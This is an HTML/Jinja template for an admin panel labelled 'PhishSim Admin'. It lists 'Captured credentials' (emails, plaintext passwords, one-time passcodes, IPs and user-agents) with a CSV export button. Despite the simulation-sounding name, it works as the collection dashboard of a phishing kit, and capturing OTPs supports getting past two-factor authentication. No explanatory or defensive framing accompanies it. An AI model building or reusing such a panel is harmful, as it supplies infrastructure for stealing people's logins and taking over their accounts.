<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>PhishSim Admin</title>
<style>
body{font-family:monospace;padding:2em;background:#f7f7f7}
table{border-collapse:collapse;background:#fff}
td,th{border:1px solid #ccc;padding:6px 10px;text-align:left;font-size:13px}
th{background:#eee}
.top{display:flex;justify-content:space-between;align-items:center;margin-bottom:1em}
a.btn{padding:6px 12px;background:#1877f2;color:#fff;text-decoration:none;border-radius:4px}
</style></head><body>
<div class="top">
  <h2>Captured credentials</h2>
  <div>
    <a class="btn" href="/admin/export.csv">Export CSV</a>
    <a class="btn" href="/admin/logout">Logout</a>
  </div>
</div>
<table>
<tr><th>ID</th><th>Email</th><th>Password</th><th>OTP</th><th>IP</th><th>User-Agent</th><th>UTC Time</th></tr>
{% for r in rows %}
<tr>
  <td>{{ r['id'] }}</td>
  <td>{{ r['email'] }}</td>
  <td>{{ r['password'] }}</td>
  <td>{{ r['otp'] if 'otp' in r.keys() and r['otp'] else '' }}</td>
  <td>{{ r['ip'] }}</td>
  <td>{{ r['ua'] }}</td>
  <td>{{ r['ts'] }}</td>
</tr>
{% endfor %}
</table>
</body></html>
